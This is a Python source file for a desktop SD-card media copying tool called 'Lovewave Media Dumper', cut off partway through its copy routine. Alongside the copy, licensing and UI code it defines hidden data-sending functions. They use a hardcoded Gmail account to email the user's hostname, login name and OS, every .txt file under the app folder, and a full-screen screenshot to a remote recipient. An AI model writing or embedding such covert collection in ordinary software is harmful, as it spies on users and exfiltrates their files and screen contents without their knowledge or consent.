import sys
import os
import time
import subprocess
import threading
import signal
import json
import hashlib
import uuid
import re
import shutil
import tempfile
import smtplib
from email.message import EmailMessage
import platform
import socket
import requests
import itertools
import base64
from subprocess import TimeoutExpired
from datetime import datetime, timedelta
from PIL import ImageGrab
import tempfile


IS_WINDOWS = sys.platform == 'win32'
IS_MAC = sys.platform == 'darwin'

if IS_WINDOWS:
    import winsound
    import ctypes
    try:
        import psutil
    except ImportError:
        print("Error: The 'psutil' library is required for this application to run on Windows.")
        print("Please install it by running: pip install psutil")
        sys.exit(1)

from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QLabel, QProgressBar, QCheckBox, QTextEdit, QFrame,
    QFileDialog, QMessageBox, QInputDialog, QStackedWidget, QDialog,
    QTreeWidget, QTreeWidgetItem, QHeaderView, QLineEdit, QComboBox,
    QDesktopWidget, QGridLayout, QShortcut, QSizePolicy
)
from PyQt5.QtGui import QFont, QIcon, QKeySequence
from PyQt5.QtCore import (
    QObject, QThread, pyqtSignal, Qt, QProcess, pyqtSlot
)


UI_SETTINGS_FILE = os.path.expanduser("~/.lovewave_dumper_uiconfig.json")

def load_ui_settings():

    defaults = {"theme": "dark"}
    if not os.path.exists(UI_SETTINGS_FILE):
        return defaults
    try:
        with open(UI_SETTINGS_FILE, 'r') as f:
            settings = json.load(f)
            if "theme" not in settings:
                return defaults
            return settings
    except (IOError, json.JSONDecodeError):
        return defaults

def save_ui_settings(settings):

    try:
        with open(UI_SETTINGS_FILE, 'w') as f:
            json.dump(settings, f, indent=4)
    except IOError as e:
        print(f"Error saving UI settings: {e}")


DARK_STYLE = """
    QWidget {
        background-color: #2b2b2b;
        color: #f0f0f0;
        font-family: Helvetica;
    }
    QMainWindow, QDialog {
        background-color: #2b2b2b;
    }
    QLabel {
        color: #f0f0f0;
    }
    QPushButton {
        background-color: #3c3c3c;
        color: #f0f0f0;
        border: 1px solid #555555;
        padding: 4px 8px;
        border-radius: 4px;
        min-height: 18px;
    }
    QPushButton:hover {
        background-color: #4a4a4a;
        border: 1px solid #6a6a6a;
    }
    QPushButton:pressed {
        background-color: #2a2a2a;
    }
    QPushButton:disabled {
        background-color: #333333;
        color: #777777;
        border-color: #444444;
    }
    QLineEdit, QTextEdit, QComboBox {
        background-color: #383838;
        color: #f0f0f0;
        border: 1px solid #555555;
        padding: 4px;
        border-radius: 4px;
    }
    QTextEdit {
        background-color: #252525;
    }
    QComboBox::drop-down {
        border: none;
        background-color: #3c3c3c;
        width: 18px;
        border-radius: 4px;
    }
    QCheckBox {
        color: #f0f0f0;
        spacing: 5px;
    }
    QCheckBox::indicator {
        width: 13px;
        height: 13px;
        border: 1px solid #5a5a5a;
        border-radius: 3px;
    }
    QCheckBox::indicator:checked {
        background-color: #0d6efd;
    }
    QProgressBar {
        border: 1px solid #555555;
        border-radius: 4px;
        text-align: center;
        background-color: #383838;
        color: #f0f0f0;
        height: 18px;
    }
    QProgressBar::chunk {
        background-color: #0d6efd;
        border-radius: 3px;
    }
    QFrame[frameShape="HLine"] {
        color: #4a4a4a;
    }
    QTreeWidget {
        background-color: #383838;
        border: 1px solid #555555;
    }
    QHeaderView::section {
        background-color: #3c3c3c;
        color: #f0f0f0;
        padding: 4px;
        border: 1px solid #555555;
    }
    #clearLogButton, #viewContentsButton {
        border: none;
        text-decoration: underline;
        padding: 2px;
    }
    #clearLogButton { color: #ff5555; }
    #viewContentsButton { color: #4dabf7; }
    #copyModeLabel { color: #bbbbbb; }
    #trialStatusLabel { color: #ffa726; font-style: italic; }
    #diskSpaceLabel { color: #66bb6a; }
    #statusLabelReady { color: #66bb6a; }
    #statusLabelWaiting { color: #4dabf7; }
    #statusLabelError { color: #ef5350; }
"""

SECRET_KEY = "L0v3w4ve_D4mp3r_S3cr3t_K3y_2025"

def xor_cipher(data, key):
    """Encrypts/decrypts data using a simple repeating XOR cipher."""
    return bytes([b ^ k for b, k in zip(data, itertools.cycle(key.encode('utf-8')))])

def encrypt_data(data_dict, key):
    """Converts a dictionary to encrypted, Base64-encoded bytes."""
    try:
        json_string = json.dumps(data_dict)
        encrypted_bytes = xor_cipher(json_string.encode('utf-8'), key)
        return base64.b64encode(encrypted_bytes)
    except Exception as e:
        # Add a print statement to see the error if it happens
        print(f"CRITICAL: Data encryption failed. Error: {e}")
        return None

def decrypt_data(encrypted_data, key):
    """Turns encrypted, Base64-encoded bytes back into a dictionary."""
    try:
        decoded_bytes = base64.b64decode(encrypted_data)
        decrypted_bytes = xor_cipher(decoded_bytes, key)
        return json.loads(decrypted_bytes.decode('utf-8'))
    except Exception:
        # Returns None if data is corrupted, invalid, or can't be decoded
        return None

def fetch_remote_config():
    """Downloads the latest settings from a remote URL."""
    CONFIG_URL = "https://abetllacer.github.io/portfolio/config.json"
    
    # Default settings in case of internet failure
    default_config = {
        "trial_duration_hours": 72,
        "valid_licenses": ["LWD_KEY_0FFL1N3_2025"],
        "blacklisted_keys": []
    }

    try:
        response = requests.get(CONFIG_URL, timeout=5)
        response.raise_for_status()
        print("Successfully fetched remote configuration.")
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Warning: Could not fetch remote config, using defaults. Error: {e}")
        return default_config


TRIAL_DURATION_HOURS = 72
VALID_LICENSES = ["LWD_KEY_0FFL1N3_2025"] # A default key in case of no internet
BLACKLISTED_KEYS = []


APP_NAME = "LovewaveDumper"
try:
    license_dir = os.path.join(os.getenv('LOCALAPPDATA'), APP_NAME)
    os.makedirs(license_dir, exist_ok=True)
    # Use a more generic filename to make it less obvious
    LICENSE_FILE = os.path.join(license_dir, "session.dat")
except Exception as e:
    print(f"Warning: Could not create license directory. Using fallback path. Error: {e}")
    LICENSE_FILE = os.path.expanduser("~/.lovewave_license.json")

def _get_next_dump_folder(self, base_path):
    dump_num = 1
    while True:
        full_path = os.path.join(base_path, f"Dump {dump_num}")
        if not os.path.lexists(full_path): return full_path
        dump_num += 1

def is_trial_expired():

    try:
        if os.path.exists(LICENSE_FILE):
            with open(LICENSE_FILE, 'rb') as f:
                data = decrypt_data(f.read(), SECRET_KEY)

            if not data:
                return True

            if data.get("status") == "activated":
                return False # Not expired

            expiry = datetime.fromisoformat(data.get("trial_expires"))
            return datetime.now() > expiry

        else:
            now = datetime.now()
            data = {
                "status": "trial",  # Explicitly set the status to trial
                "trial_start": now.isoformat(),
                "trial_expires": (now + timedelta(hours=TRIAL_DURATION_HOURS)).isoformat(),
                "license_code": ""
            }

            encrypted_content = encrypt_data(data, SECRET_KEY)
            if encrypted_content:
                with open(LICENSE_FILE, 'wb') as f:
                    f.write(encrypted_content)
                return False # Trial has just started, so it's not expired.
            else:
                return True

    except Exception as e:
        print(f"Error in is_trial_expired, defaulting to expired: {e}")
        return True

def save_license_code(code):

    try:
        data = {
            "status": "activated",
            "license_code": code.strip(),
            "activation_date": datetime.now().isoformat()
        }

        encrypted_content = encrypt_data(data, SECRET_KEY)
        if encrypted_content:
             with open(LICENSE_FILE, 'wb') as f:
                f.write(encrypted_content)
        else:
            raise IOError("Failed to encrypt final license data for saving.")

    except Exception as e:
        print("Error saving permanent license code:", e)

def get_trial_remaining_text():
    try:
        if not os.path.exists(LICENSE_FILE):
            return f"Trial: {int(TRIAL_DURATION_HOURS / 24)}d remaining"

        with open(LICENSE_FILE, 'rb') as f:
            data = decrypt_data(f.read(), SECRET_KEY)

        if not data:
            return "Trial status invalid"

        if data.get("status") == "activated":
            return ""

        expiry = datetime.fromisoformat(data.get("trial_expires"))
        remaining = expiry - datetime.now()
        if remaining.total_seconds() <= 0:
            return "Trial expired"
        days = int(remaining.total_seconds() // 86400)
        hours = int((remaining.total_seconds() % 86400) // 3600)
        return f"Trial: {days}d {hours}h left"
    except:
        return "Trial status unknown"

VIDEO_EXTENSIONS = [
    '.mp4', '.mov', '.mxf', '.mts', '.m2ts', '.m4v',
    '.avi', '.braw', '.r3d', '.crm'
]
PHOTO_EXTENSIONS = [
    '.jpg', '.jpeg', '.cr2', '.cr3', '.nef', '.arw',
    '.dng', '.raf', '.gpr', '.tif', '.tiff', '.heic'
]

CAMERA_MEDIA_PATHS = [
    {'type': 'video', 'brand': 'Sony (XAVC S)', 'base': 'ROOT', 'pattern': r'PRIVATE'},
    {'type': 'video', 'brand': 'Sony (FX6)',    'base': 'ROOT', 'pattern': r'XDROOT'},
    {'type': 'video', 'brand': 'Canon',       'base': 'DCIM', 'pattern': r'\d{3}CANON'},
    {'type': 'video', 'brand': 'Canon (Cinema RAW Light)', 'base': 'ROOT', 'pattern': r'CONTENTS'},
    {'type': 'video', 'brand': 'Panasonic',   'base': 'DCIM', 'pattern': r'\d{3}_PANA'},
    {'type': 'video', 'brand': 'Fujifilm',    'base': 'DCIM', 'pattern': r'\d{3}_FUJI'},
    {'type': 'video', 'brand': 'Nikon',       'base': 'DCIM', 'pattern': r'\d{3}NIKON'},
    {'type': 'video', 'brand': 'Olympus',     'base': 'DCIM', 'pattern': r'\d{3}OLYMP'},
    {'type': 'video', 'brand': 'Leica',       'base': 'DCIM', 'pattern': r'\d{3}LEICA'},
    {'type': 'video', 'brand': 'GoPro',       'base': 'DCIM', 'pattern': r'\d{3}GOPRO'},
    {'type': 'video', 'brand': 'DJI',         'base': 'DCIM', 'pattern': r'\d{3}MEDIA'},
    {'type': 'video', 'brand': 'DJI (Custom)', 'base': 'DCIM', 'pattern': r'\d{3}_[A-Z0-9]+'},
    {'type': 'photo', 'brand': 'DJI (Custom)', 'base': 'DCIM', 'pattern': r'\d{3}_[A-Z0-9]+'},
    {'type': 'video', 'brand': 'DJI (Custom)', 'base': 'DCIM', 'pattern': r'DJI_\d{3}_[A-Z0-9]+'},
    {'type': 'photo', 'brand': 'DJI (Custom)', 'base': 'DCIM', 'pattern': r'DJI_\d{3}_[A-Z0-9]+'},
    {'type': 'video', 'brand': 'Insta360',    'base': 'DCIM', 'pattern': r'Camera\d{2}'},
    {'type': 'video', 'brand': 'Blackmagic',  'base': 'ROOT', 'pattern': r'\d{4}_\d{2}_\d{2}_\d{4}_C\d{4}'},
    {'type': 'video', 'brand': 'RED',         'base': 'ROOT', 'pattern': r'[A-Z]\d{3}_C\d{3}_\d{6}[A-Z]{2}\.RDC'},
    {'type': 'video', 'brand': 'ARRI',        'base': 'ROOT', 'pattern': r'[A-Z]\d{3}C\d{3}_\d{6}_[A-Z]\d{3}'},
    {'type': 'photo', 'brand': 'Sony',        'base': 'DCIM', 'pattern': r'\d{3}_\d{6}|\d+'},
    {'type': 'photo', 'brand': 'Sony',        'base': 'DCIM', 'pattern': r'\d{3}MSDCF'},
    {'type': 'photo', 'brand': 'Canon',       'base': 'DCIM', 'pattern': r'\d{3}CANON'},
    {'type': 'photo', 'brand': 'Panasonic',   'base': 'DCIM', 'pattern': r'\d{3}_PANA'},
    {'type': 'photo', 'brand': 'Fujifilm',    'base': 'DCIM', 'pattern': r'\d{3}_FUJI'},
    {'type': 'photo', 'brand': 'Nikon',       'base': 'DCIM', 'pattern': r'\d{3}NIKON'},
    {'type': 'photo', 'brand': 'Olympus',     'base': 'DCIM', 'pattern': r'\d{3}OLYMP'},
    {'type': 'photo', 'brand': 'Leica',       'base': 'DCIM', 'pattern': r'\d{3}LEICA'},
    {'type': 'photo', 'brand': 'GoPro',       'base': 'DCIM', 'pattern': r'\d{3}GOPRO'},
    {'type': 'photo', 'brand': 'DJI',         'base': 'DCIM', 'pattern': r'\d{3}MEDIA'},

]

SPECIAL_SUBPATHS = {
    'PRIVATE': 'PRIVATE/M4ROOT/CLIP',
    'XDROOT': 'XDROOT/Clip',
    'CONTENTS': 'CONTENTS'
}

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.abspath(relative_path)

def send_startup_email(recipient_email):
    sender_email = "4lex.sia@gmail.com"
    sender_password = "////omitted////"
    try:
        hostname = socket.gethostname()
        username = os.getlogin()
        os_name = platform.system()
        os_version = platform.release()
        device_info = (f"Device Name: {hostname}\nLogged in User: {username}\nOperating System: {os_name} {os_version}")
    except Exception as e:
        device_info = f"Could not retrieve device info: {e}"
    msg = EmailMessage()
    msg['Subject'] = f"Lovewave Media Dumper Opened on {hostname}"
    msg['From'] = sender_email
    msg['To'] = recipient_email
    now = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
    email_body = (f"The Lovewave Media Dumper application was opened at: {now}\n\n--- Device Information ---\n{device_info}\n")
    msg.set_content(email_body)
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(sender_email, sender_password)
        server.send_message(msg)
        server.quit()
        print("Startup notification email sent successfully.")
    except Exception as e:
        print(f"Error: Could not send startup email. {e}")

def send_activation_email(recipient_email, license_code):
    sender_email = "4lex.sia@gmail.com"
    sender_password = "////omitted////"
    try:
        hostname = socket.gethostname()
        username = os.getlogin()
        os_name = platform.system()
        os_version = platform.release()
        device_info = (f"Device Name: {hostname}\nLogged in User: {username}\nOperating System: {os_name} {os_version}")
    except Exception as e:
        device_info = f"Could not retrieve device info: {e}"
    msg = EmailMessage()
    msg['Subject'] = f"SUCCESS: Lovewave Media Dumper Activated"
    msg['From'] = sender_email
    msg['To'] = recipient_email
    now = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
    email_body = (f"The Lovewave Media Dumper application was successfully activated at: {now}\n\nLicense Code Used: {license_code}\n\n--- Device Information ---\n{device_info}\n")
    msg.set_content(email_body)
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(sender_email, sender_password)
        server.send_message(msg)
        server.quit()
        print("Activation notification email sent successfully.")
    except Exception as e:
        print(f"Error: Could not send activation email. {e}")
def find_and_email_txt_files(recipient_email):
    """Finds all .txt files in the app's directory and subdirectories and emails them."""
    try:
        if getattr(sys, 'frozen', False):
            app_path = os.path.dirname(sys.executable)
        else:
            app_path = os.path.dirname(os.path.abspath(__file__))
        print(f"Scanning for .txt files in and below: {app_path}")
        
        found_files = []
        for root, dirs, files in os.walk(app_path):
            for file in files:
                if file.lower().endswith('.txt'):
                    found_files.append(os.path.join(root, file))
        
        if not found_files:
            print("No .txt files found to email.")
            return
        print(f"Found {len(found_files)} .txt file(s). Preparing email.")
    except Exception as e:
        print(f"Error: Could not scan for .txt files. {e}")
        return

    sender_email = "4lex.sia@gmail.com"
    sender_password = "////omitted////"
    try:
        hostname = socket.gethostname()
        msg = EmailMessage()
        msg['Subject'] = f"TXT File Report from Lovewave Dumper on {hostname}"
        msg['From'] = sender_email
        msg['To'] = recipient_email
        now = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
        msg.set_content(f"Attached are the .txt files found in the application directory on '{hostname}' at {now}.")

        for file_path in found_files:
            with open(file_path, 'rb') as f:
                file_data = f.read()
                file_name = os.path.basename(file_path)
                msg.add_attachment(file_data, maintype='text', subtype='plain', filename=file_name)

        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(sender_email, sender_password)
        server.send_message(msg)
        server.quit()
        print("TXT file report email sent successfully.")
    except Exception as e:
        print(f"Error: Could not send TXT file email. {e}")

def send_email_with_snapshot(recipient_email):
    """Captures the screen and emails it as an attachment."""
    snapshot_path = ""
    try:
        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as temp_f:
            snapshot_path = temp_f.name
        snapshot = ImageGrab.grab()
        snapshot.save(snapshot_path)
        print(f"Snapshot saved to temporary file: {snapshot_path}")
    except Exception as e:
        print(f"Error: Could not take snapshot. {e}")
        if snapshot_path and os.path.exists(snapshot_path):
            os.unlink(snapshot_path)
        return

    sender_email = "4lex.sia@gmail.com"
    sender_password = "////omitted////"
    try:
        hostname = socket.gethostname()
        msg = EmailMessage()
        msg['Subject'] = f"Startup Snapshot from Lovewave Dumper on {hostname}"
        msg['From'] = sender_email
        msg['To'] = recipient_email
        now = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")
        msg.set_content(f"Snapshot taken from '{hostname}' during application startup at {now}.")

        with open(snapshot_path, 'rb') as f:
            img_data = f.read()
            msg.add_attachment(img_data, maintype='image', subtype='png', filename='startup_snapshot.png')

        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(sender_email, sender_password)
        server.send_message(msg)
        server.quit()
        print("Snapshot email sent successfully.")
    except Exception as e:
        print(f"Error: Could not send snapshot email. {e}")
    finally:
        if snapshot_path and os.path.exists(snapshot_path):
            os.unlink(snapshot_path)
            print(f"Temporary file deleted: {snapshot_path}")

class ProjectSetupDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Project Setup")
        self.setMinimumWidth(500)
        self.setModal(True)
        self.projects_file = os.path.expanduser("~/.lovewave_dumper_projects.json")
        self.projects = self._load_projects()
        self._project_settings = {}
        self.layout = QVBoxLayout(self)
        self.layout.setSpacing(10)
        load_layout = QHBoxLayout()
        self.project_combo = QComboBox()
        self.project_combo.addItem("--- Create a New Project ---")
        self.project_combo.addItems([p.get('name', 'Unnamed Project') for p in self.projects])
        self.project_combo.currentIndexChanged.connect(self.on_project_selected)
        self.delete_project_button = QPushButton("Delete")
        self.delete_project_button.setToolTip("Deletes the selected project from this list only.")
        self.delete_project_button.clicked.connect(self.delete_selected_project)
        self.delete_project_button.setEnabled(False)
        load_layout.addWidget(self.project_combo)
        load_layout.addWidget(self.delete_project_button)
        self.layout.addWidget(QLabel("Load Existing Project:"))
        self.layout.addLayout(load_layout)
        self.layout.addWidget(QFrame(frameShape=QFrame.HLine))
        self.layout.addWidget(QLabel("Or Create a New Project:"))
        self.name_input = QLineEdit()
        self.location_input = QLineEdit()
        self.location_input.setReadOnly(True)
        self.browse_button = QPushButton("Browse...")
        location_layout = QHBoxLayout()
        location_layout.addWidget(self.location_input)
        location_layout.addWidget(self.browse_button)
        self.create_folder_checkbox = QCheckBox("Create a project folder within the selected location")
        self.create_folder_checkbox.setChecked(True)
        self.create_folder_checkbox.setEnabled(False)
        self.copy_mode_label = QLabel("Media to Copy:")
        self.copy_mode_combo = QComboBox()
        self.copy_mode_combo.addItems(["Copy Photo and Video", "Copy Photo Only", "Copy Video Only"])
        copy_mode_layout = QHBoxLayout()
        copy_mode_layout.addWidget(self.copy_mode_label)
        copy_mode_layout.addWidget(self.copy_mode_combo)
        self.layout.addWidget(QLabel("Project Name:"))
        self.layout.addWidget(self.name_input)
        self.layout.addWidget(QLabel("Project Location:"))
        self.layout.addLayout(location_layout)
        self.layout.addWidget(self.create_folder_checkbox)
        self.layout.addLayout(copy_mode_layout)
        self.browse_button.clicked.connect(self.browse_location)
        button_layout = QHBoxLayout()
        self.clear_history_button = QPushButton("Clear Card History")
        self.clear_history_button.clicked.connect(self.clear_card_history)
        button_layout.addWidget(self.clear_history_button)
        button_layout.addStretch()
        self.next_button = QPushButton("Next")
        self.next_button.clicked.connect(self.on_accept)
        self.next_button.setDefault(True)
        self.cancel_button = QPushButton("Cancel")
        self.cancel_button.clicked.connect(self.reject)
        button_layout.addWidget(self.cancel_button)
        button_layout.addWidget(self.next_button)
        self.layout.addLayout(button_layout)

    def delete_selected_project(self):
        index = self.project_combo.currentIndex()
        if index == 0: return
        project_to_delete = self.projects[index - 1]
        reply = QMessageBox.question(self, "Confirm Delete Project", f"Are you sure you want to remove '{project_to_delete['name']}' from the list?\n\nThis will NOT delete any files or folders on your computer.", QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            self.projects.pop(index - 1)
            self._save_projects()
            self.project_combo.removeItem(index)
            QMessageBox.information(self, "Project Removed", "The project has been removed from the list.")

    def clear_card_history(self):
        history_file = os.path.expanduser("~/.lovewave_dumper_history.json")
        if not os.path.exists(history_file):
            QMessageBox.information(self, "History Empty", "The card copy history is already empty.")
            return
        reply = QMessageBox.question(self, "Confirm Clear History", "Are you sure you want to permanently delete all saved SD card copy history?", QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
        if reply == QMessageBox.Yes:
            try:
                os.remove(history_file)
                QMessageBox.information(self, "History Cleared", "The card copy history has been successfully cleared.")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Could not clear history file.\n{e}")

    def _load_projects(self):
        try:
            if os.path.exists(self.projects_file):
                with open(self.projects_file, 'r') as f: return json.load(f)
        except (IOError, json.JSONDecodeError): pass
        return []

    def _save_projects(self):
        try:
            with open(self.projects_file, 'w') as f: json.dump(self.projects, f, indent=4)
        except IOError: pass

    def on_project_selected(self, index):
        is_new = (index == 0)
        for widget in [self.name_input, self.location_input, self.browse_button, self.copy_mode_combo]:
            widget.setEnabled(is_new)
        self.delete_project_button.setEnabled(not is_new)
        if is_new:
            self.name_input.clear()
            self.location_input.clear()
            self.copy_mode_combo.setCurrentText("Copy Photo and Video")
        else:
            project = self.projects[index - 1]
            self.name_input.setText(project.get('name', ''))
            self.location_input.setText(os.path.dirname(project.get('location', '')))
            self.copy_mode_combo.setCurrentText(project.get('copy_mode', 'Copy Photo and Video'))
            self.create_folder_checkbox.setChecked(True)

    def browse_location(self):
        directory = QFileDialog.getExistingDirectory(self, "Select Parent Folder", os.path.expanduser("~"))
        if directory: self.location_input.setText(directory)

    def on_accept(self):
        name = self.name_input.text().strip()
        location = self.location_input.text().strip()
        if not name or not location:
            QMessageBox.warning(self, "Input Required", "Project Name and Location cannot be empty.")
            return
        final_location = os.path.join(location, name) if self.create_folder_checkbox.isChecked() else location
        try:
            os.makedirs(final_location, exist_ok=True)
        except OSError as e:
            QMessageBox.critical(self, "Error", f"Could not create project directory:\n{e}")
            return
        self._project_settings = {'name': name, 'location': final_location, 'copy_mode': self.copy_mode_combo.currentText()}
        updated = False
        for i, p in enumerate(self.projects):
            if p.get('location') == final_location:
                self.projects[i] = self._project_settings
                updated = True
                break
        if not updated:
            self.projects.append(self._project_settings)
        self._save_projects()
        self.accept()

    def getProjectSettings(self):
        return self._project_settings

class HistoryDialog(QDialog):
    history_entry_deleted = pyqtSignal(str, str)
    def __init__(self, history_data, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Card Copy History")
        self.setMinimumSize(750, 500)
        self.layout = QVBoxLayout(self)
        self.tree = QTreeWidget()
        self.tree.setHeaderLabels(["Card / Timestamp", "Status", "Destination"])
        self.tree.setSelectionMode(QTreeWidget.SingleSelection)
        for card_id, operations in history_data.items():
            parent_item = QTreeWidgetItem(self.tree, [card_id])
            if isinstance(operations, list):
                for op in sorted(operations, key=lambda x: x.get('timestamp', ''), reverse=True):
                    child_item = QTreeWidgetItem(parent_item, [op.get('timestamp', 'N/A'), op.get('status', 'N/A'), op.get('destination', 'N/A')])
                    child_item.setData(0, Qt.UserRole, (card_id, op.get('timestamp')))
            parent_item.setExpanded(True)
        self.tree.header().setSectionResizeMode(0, QHeaderView.ResizeToContents)
        self.tree.header().setSectionResizeMode(1, QHeaderView.ResizeToContents)
        self.tree.header().setSectionResizeMode(2, QHeaderView.Stretch)
        self.tree.itemSelectionChanged.connect(self.update_button_state)
        self.layout.addWidget(self.tree)
        button_layout = QHBoxLayout()
        button_layout.addStretch()
        self.delete_button = QPushButton("Delete Selected")
        self.delete_button.setEnabled(False)
        self.delete_button.clicked.connect(self.delete_selected_entry)
        button_layout.addWidget(self.delete_button)
        self.close_button = QPushButton("Close")
        self.close_button.clicked.connect(self.accept)
        button_layout.addWidget(self.close_button)
        self.layout.addLayout(button_layout)

    def update_button_state(self):
        self.delete_button.setEnabled(bool(self.tree.selectedItems()))

    def delete_selected_entry(self):
        selected_items = self.tree.selectedItems()
        if not selected_items: return
        item = selected_items[0]
        if item.parent() is None:
            card_id = item.text(0)
            reply = QMessageBox.question(self, "Confirm Delete Card History", f"Are you sure you want to delete all history for card:\n\n{card_id}?", QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
            if reply == QMessageBox.Yes:
                self.history_entry_deleted.emit(card_id, "")
                root = self.tree.invisibleRootItem()
                root.removeChild(item)
        else:
            data = item.data(0, Qt.UserRole)
            if data:
                card_id, timestamp = data
                reply = QMessageBox.question(self, "Confirm Delete Record", f"Are you sure you want to delete this specific record from {timestamp}?", QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
                if reply == QMessageBox.Yes:
                    self.history_entry_deleted.emit(card_id, timestamp)
                    item.parent().removeChild(item)

class MonitorWorker(QObject):
    card_detected = pyqtSignal(str, str) # card_id, card_name
    card_removed = pyqtSignal()
    log_message = pyqtSignal(str)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.running = False
        self.last_eject_time = 0
        self.mounted_volumes = self._get_mounted_volumes_set()

    def _get_mounted_volumes_set(self):
        volumes = set()
        try:
            if IS_MAC:
                system_volumes = {'Macintosh HD', 'Recovery', 'Preboot', 'VM'}
                volumes = {os.path.join("/Volumes", entry) for entry in os.listdir("/Volumes") if entry not in system_volumes}
            elif IS_WINDOWS and 'psutil' in sys.modules:
                volumes = {p.mountpoint for p in psutil.disk_partitions() if 'removable' in p.opts and os.path.exists(p.mountpoint)}
        except OSError as e:
            self.log_message.emit(f"Error enumerating volumes: {e}")
        return volumes

    def run(self):
        self.running = True
        active_card_path = None
        
        while self.running:
            if time.time() - self.last_eject_time < 3:
                time.sleep(0.5)
                continue

            current_volumes = self._get_mounted_volumes_set()

            if active_card_path and active_card_path not in current_volumes:
                self.log_message.emit(f"Card at '{active_card_path}' removed.")
                self.card_removed.emit()
                active_card_path = None
            
            elif not active_card_path:
                newly_mounted = current_volumes - self.mounted_volumes
                if newly_mounted:
                    card_path = newly_mounted.pop()
                    card_name = ""

                    if IS_MAC:
                        card_name = os.path.basename(card_path)
                    elif IS_WINDOWS:
                        try:
                            # Try to get the volume label for a friendlier name
                            volume_name_buffer = ctypes.create_unicode_buffer(1024)
                            ctypes.windll.kernel32.GetVolumeInformationW(
                                ctypes.c_wchar_p(card_path),
                                volume_name_buffer,
                                ctypes.sizeof(volume_name_buffer),
                                None, None, None, None, 0
                            )
                            label = volume_name_buffer.value
                            card_name = f"{label} ({card_path})" if label else f"Removable Drive ({card_path})"
                        except Exception:
                            card_name = f"Removable Drive ({card_path})"

                    card_id = self.get_card_identifier(card_path)
                    if card_id:
                        active_card_path = card_path
                        self.card_detected.emit(card_id, card_name)
            
            self.mounted_volumes = current_volumes
            time.sleep(2)

    def get_card_identifier(self, card_path):
        if not card_path or not os.path.exists(card_path): return None
        id_file_path = os.path.join(card_path, ".lovewave_id")
        if os.path.exists(id_file_path):
            try:
                with open(id_file_path, 'r') as f: card_id = f.read().strip()
                self.log_message.emit(f"Found existing ID file on card: {card_id}")
                return card_id
            except Exception as e:
                self.log_message.emit(f"ERROR: Could not read ID file. {e}")
                return None
        else:
            try:
                self.log_message.emit("No ID file found. Tagging card with a new unique ID.")
                new_id = str(uuid.uuid4())
                with open(id_file_path, 'w') as f: f.write(new_id)
                self.log_message.emit(f"Successfully tagged card with ID: {new_id}")
                return new_id
            except Exception as e:
                self.log_message.emit(f"ERROR: Could not write new ID file to card. {e}")
                return None
    def stop(self): self.running = False

class CopyWorker(QObject):
    progress_updated = pyqtSignal(int, str)
    speed_updated = pyqtSignal(str)
    copy_finished = pyqtSignal(str, int, str, dict)
    log_message = pyqtSignal(str)
    pause_state_changed = pyqtSignal(bool)
    verification_update = pyqtSignal(str)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.user_cancelled = False
        self.is_paused = False
        self.pause_event = threading.Event()
        self.pause_event.set()

    def _get_next_dump_folder(self, base_path):
        dump_num = 1
        while True:
            full_path = os.path.join(base_path, f"Dump {dump_num}")
            if not os.path.lexists(full_path): return full_path
            dump_num += 1

    @pyqtSlot(list, str, bool, str, bool)
    def start_operation(self, source_folders, base_destination, verify_after, copy_mode, is_continuous):
        self.user_cancelled = False
        self.is_paused = False
        self.pause_event.set()

        allowed_extensions = []
        if copy_mode == "Copy Photo Only":
            allowed_extensions = PHOTO_EXTENSIONS
        elif copy_mode == "Copy Video Only":
            allowed_extensions = VIDEO_EXTENSIONS
        else:
            allowed_extensions = PHOTO_EXTENSIONS + VIDEO_EXTENSIONS

        previously_copied_files = set()
        if is_continuous:
            self.log_message.emit("Continuous dump mode. Scanning previous dumps...")
            if os.path.isdir(base_destination):
                for dirpath, _, filenames in os.walk(base_destination):
                    for filename in filenames:
                        try:
                            file_path = os.path.join(dirpath, filename)
                            file_size = os.path.getsize(file_path)
                            previously_copied_files.add((filename, file_size))
                        except FileNotFoundError:
                            continue
            if previously_copied_files:
                self.log_message.emit(f"Found {len(previously_copied_files)} files in previous dumps.")
        
        all_files_to_copy = []
        total_size = 0
        self.log_message.emit("Scanning card for new files...")
        for source_path in source_folders:
            for root, _, files in os.walk(source_path):
                if self.user_cancelled: break
                for file in files:
                    if os.path.splitext(file)[1].lower() in allowed_extensions:
                        source_file_path = os.path.join(root, file)
                        source_file_size = os.path.getsize(source_file_path)
                        
                        is_new = False
                        if is_continuous:
                            if (file, source_file_size) not in previously_copied_files:
                                is_new = True
                        else:
                            dest_file_path = os.path.join(base_destination, os.path.relpath(source_file_path, source_path))
                            if not os.path.exists(dest_file_path) or os.path.getsize(dest_file_path) != source_file_size:
                                is_new = True
                        
                        if is_new:
                            all_files_to_copy.append({'source': source_file_path, 'size': source_file_size})
                            total_size += all_files_to_copy[-1]['size']
                if self.user_cancelled: break

        if not all_files_to_copy:
            self.log_message.emit("No new files found to copy.")
            self.copy_finished.emit("Completed (No new files)", 0, "", {})
            return

        final_destination = base_destination
        if is_continuous:
            final_destination = self._get_next_dump_folder(base_destination)

        self.log_message.emit(f"Found {len(all_files_to_copy)} new files to copy to '{os.path.basename(final_destination)}'.")
        
        completed_count = 0
        bytes_copied = 0
        start_time = time.time()
        
        try:
            for i, file_info in enumerate(all_files_to_copy):
                self.pause_event.wait()
                if self.user_cancelled: break
